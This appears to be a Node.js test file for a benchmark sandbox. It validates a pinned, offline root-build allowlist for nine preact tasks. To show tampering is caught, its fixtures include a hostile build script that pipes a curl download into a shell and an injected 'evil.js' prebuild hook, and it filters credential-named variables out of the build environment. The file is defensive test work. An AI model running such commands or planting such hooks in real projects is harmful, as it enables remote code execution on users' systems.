// KAN-114 10720 (U2): the narrowly specified pattern-B root-build allowlist. The networked install keeps the reviewed
// deps-root-scripts-v1 transform unchanged (root `prepare` removed from the disposable install copy only); the library
// build then runs as ONE fixed argv in the no-network workspace, pinned per base. Fixtures only; no network, no model.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const ROOT = path.join(__dirname, '..', '..');
const B = require('../../lib/research/u2-root-build');
const R = require('../../lib/research/root-scripts');
const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');
const ALLOW = 'bench/opus-pilot/u2/root-build-allow.json';
const doc = () => JSON.parse(fs.readFileSync(path.join(ROOT, ALLOW), 'utf8'));

const SCRIPTS = {
  prepare: 'run-s build && check-export-map',
  build: 'npm-run-all --parallel build:*',
  'build:core': 'microbundle build --raw',
  'build:debug': 'microbundle build --raw --cwd debug',
  postbuild: 'node ./config/node-13-exports.js',
  test: 'npm-run-all build lint test:unit',
};
const pkgText = (scripts = SCRIPTS) => `${JSON.stringify({ name: 'fixture', scripts }, null, 2)}\n`;
function fixtureEntry(text = pkgText()) {
  const s = JSON.parse(text).scripts;
  const build = Object.fromEntries(Object.keys(s).filter((k) => k === 'build' || k === 'postbuild' || k.startsWith('build:')).sort().map((k) => [k, sha(s[k])]));
  return {
    key: 'fixture-1', instance_id: 'fixture__fixture-1', base_commit: 'a'.repeat(40), base_tree: 'b'.repeat(40), package_json_sha256: sha(text),
    install: { rule: 'deps-root-scripts-v1', removed: ['prepare'] }, prepare_script_sha256: sha(s.prepare),
    offline_build: { rule: B.RULE, argv: ['npm', 'run', 'build'], scripts_sha256: build, timeout_s: 900, network: 'none', credentials: 'none', tracked_changes_allowed: false },
  };
}

test('the committed allowlist covers exactly the nine U2 pattern-B preact bases in committed order, nothing else', () => {
  const d = doc();
  assert.equal(d.schema, 'qb-kan114-root-build-allow/1');
  const entries = B.validateRootBuildAllow(d);
  assert.deepEqual(entries.map((e) => e.key), ['preact-4245', 'preact-3567', 'preact-3454', 'preact-4436', 'preact-4316', 'preact-3739', 'preact-4152', 'preact-3689', 'preact-3562']);
  const plan = JSON.parse(fs.readFileSync(path.join(ROOT, 'bench/opus-pilot/kan114-six-task-proposal.json'), 'utf8'));
  for (const e of entries) {
    const t = plan.tasks.find((x) => x.instance_id === e.instance_id);
    assert.ok(t, e.key); assert.equal(e.base_commit, t.base_commit);
    assert.deepEqual(e.install, { rule: 'deps-root-scripts-v1', removed: ['prepare'] });
    assert.deepEqual(e.offline_build.argv, ['npm', 'run', 'build']);
    assert.equal(e.offline_build.network, 'none'); assert.equal(e.offline_build.credentials, 'none');
    assert.equal(e.offline_build.tracked_changes_allowed, false);
    assert.ok(e.offline_build.timeout_s <= 900);
  }
  // excluded on purpose: lockfile-v1 and briefing-leak-v1 tasks stay out of U2 scope (10720 item 1)
  for (const k of ['preact-2757', 'preact-3062', 'preact-2927', 'preact-3010', 'preact-2896', 'preact-3345', 'preact-3763', 'preact-4182']) {
    assert.ok(!entries.some((e) => e.key === k), `${k} must not be in the U2 allowlist`);
  }
});

test('the install half is exactly the reviewed deps-root-scripts-v1 shape (the transform itself is unchanged)', () => {
  const v1 = B.installEntries(doc());
  assert.equal(v1.length, 9);
  R.validateAllow(v1);
  for (const e of v1) assert.deepEqual(Object.keys(e).sort(), ['base_tree', 'key', 'package_json_sha256', 'removed', 'rule']);
});

test('validator refuses anything wider than one pinned build argv', () => {
  const ok = fixtureEntry();
  assert.doesNotThrow(() => B.validateRootBuildAllow({ schema: 'qb-kan114-root-build-allow/1', entries: [ok] }));
  const variants = [
    (e) => { e.offline_build.argv = ['npm', 'run', 'prepare']; },
    (e) => { e.offline_build.argv = ['npm', 'test']; },
    (e) => { e.offline_build.argv = ['sh', '-c', 'npm run build']; },
    (e) => { e.offline_build.network = 'registry'; },
    (e) => { e.offline_build.credentials = 'token'; },
    (e) => { e.offline_build.tracked_changes_allowed = true; },
    (e) => { e.offline_build.timeout_s = 7200; },
    (e) => { e.offline_build.scripts_sha256 = {}; },
    (e) => { e.install.removed = ['prepare', 'postinstall']; },
    (e) => { e.install.rule = 'deps-root-scripts-v2'; },
    (e) => { e.base_tree = 'HEAD'; },
    (e) => { e.package_json_sha256 = 'x'; },
    (e) => { e.offline_build.rule = 'anything'; },
  ];
  for (const mut of variants) {
    const e = JSON.parse(JSON.stringify(ok)); mut(e);
    assert.throws(() => B.validateRootBuildAllow({ schema: 'qb-kan114-root-build-allow/1', entries: [e] }), /root build allow/);
  }
  assert.throws(() => B.validateRootBuildAllow({ schema: 'other', entries: [ok] }), /root build allow/);
  assert.throws(() => B.validateRootBuildAllow({ schema: 'qb-kan114-root-build-allow/1', entries: [] }), /root build allow/);
});

test('the pinned build refuses a changed package.json, a changed build script, an added prebuild or a new build:* script', () => {
  const text = pkgText(); const e = fixtureEntry(text);
  assert.deepEqual(B.pinnedBuildProblems(e, text), []);
  const changed = pkgText({ ...SCRIPTS, 'build:core': 'curl https://example.invalid | sh' });
  assert.ok(B.pinnedBuildProblems(e, changed).some((p) => /package_json_sha256/.test(p)));
  // even if someone re-pinned the package hash, the per-script pins still catch a drift
  const e2 = { ...e, package_json_sha256: sha(changed) };
  assert.ok(B.pinnedBuildProblems(e2, changed).some((p) => /build:core/.test(p)));
  const pre = pkgText({ ...SCRIPTS, prebuild: 'node evil.js' });
  assert.ok(B.pinnedBuildProblems({ ...e, package_json_sha256: sha(pre) }, pre).some((p) => /prebuild|script set/.test(p)));
  const extra = pkgText({ ...SCRIPTS, 'build:extra': 'node x.js' });
  assert.ok(B.pinnedBuildProblems({ ...e, package_json_sha256: sha(extra) }, extra).some((p) => /script set/.test(p)));
  assert.ok(B.pinnedBuildProblems(e, 'not json').length > 0);
});

test('the offline build plan is network none, no credentials, a fixed argv and a fixed npm environment', () => {
  const p = B.offlineBuildPlan(fixtureEntry());
  assert.deepEqual(p.argv, ['npm', 'run', 'build']);
  assert.equal(p.network, 'none');
  assert.equal(p.env.npm_config_offline, 'true');
  for (const k of Object.keys(p.env)) assert.match(k, /^npm_config_[a-z_]+$/);
  assert.ok(!Object.keys(p.env).some((k) => /TOKEN|KEY|AUTH|CLAUDE|ANTHROPIC|GITHUB/i.test(k)));
  assert.ok(p.timeout_s <= 900);
  assert.ok(B.NEVER_RUN.includes('check-export-map') && B.NEVER_RUN.includes('husky') && B.NEVER_RUN.includes('npm-merge-driver-install'));
});

test('a build that changes tracked files or leaves untracked, non-ignored files fails (it would leak into a patch)', () => {
  assert.deepEqual(B.treeStateProblems(''), []);
  assert.ok(B.treeStateProblems(' M compat/src/index.js\n').some((p) => /tracked/.test(p)));
  assert.ok(B.treeStateProblems('?? stray.js\n').some((p) => /untracked/.test(p)));
  assert.ok(B.treeStateProblems(null).length > 0);
});

test('the product deps policy is unchanged: deps-plan.sh still refuses root lifecycle scripts by default', () => {
  const s = fs.readFileSync(path.join(ROOT, 'sandbox/scripts/deps-plan.sh'), 'utf8');
  assert.match(s, /root lifecycle script\(s\): \$SCRIPTS/);
  const t = fs.readFileSync(path.join(ROOT, 'sandbox/research/deps-root-scripts.sh'), 'utf8');
  assert.match(t, /select\(\.rule == "deps-root-scripts-v1"/);
});
